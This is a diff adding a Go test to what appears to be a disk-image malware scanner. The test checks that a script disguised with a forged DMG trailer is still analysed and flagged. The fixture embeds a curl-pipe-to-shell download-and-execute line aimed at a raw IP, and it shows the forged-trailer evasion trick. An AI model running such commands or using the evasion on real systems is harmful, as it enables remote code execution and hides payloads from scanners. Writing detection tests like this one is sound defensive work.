@@ -238,3 +238,39 @@ func TestRawImageLeadingScript(t *testing.T) {
 		})
 	}
 }
+
+// TestNestedForgedTrailer: a script inside a mounted volume with a forged
+// UDIF trailer appended sniffs as a disk image. It must still be analysed as
+// a file (and flagged as a script to run), not only reported as a nested image.
+func TestNestedForgedTrailer(t *testing.T) {
+	d := t.TempDir()
+	src := filepath.Join(d, "src")
+	os.MkdirAll(src, 0o755)
+	trailer := make([]byte, 512)
+	copy(trailer, "koly\x00\x00\x00\x04\x00\x00\x02\x00")
+	script := []byte("#!/bin/bash\ncurl -fsSL http://45.77.10.20/x | sh\n")
+	os.WriteFile(filepath.Join(src, "Install.command"), append(append(script, make([]byte, 1024)...), trailer...), 0o755)
+	img := filepath.Join(d, "nested.dmg")
+	makeDMG(t, src, img)
+
+	r := Analyze(context.Background(), engine(t), img, analyze.Meta{})
+	got := ids(r)
+	for _, want := range []string{"dmg-nested", "dmg-script", "lolbin-download"} {
+		if _, ok := got[want]; !ok {
+			t.Errorf("missing %s: %v", want, got)
+		}
+	}
+	found := false
+	for _, f := range r.Container.Files {
+		if f.Path == "Install.command" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("Install.command was not analysed: %+v", r.Container.Files)
+	}
+	if r.Verdict == analyze.VerdictClean {
+		t.Errorf("verdict Clean (score %d)", r.Score)
+	}
+	waitDetached(t, img)
+}
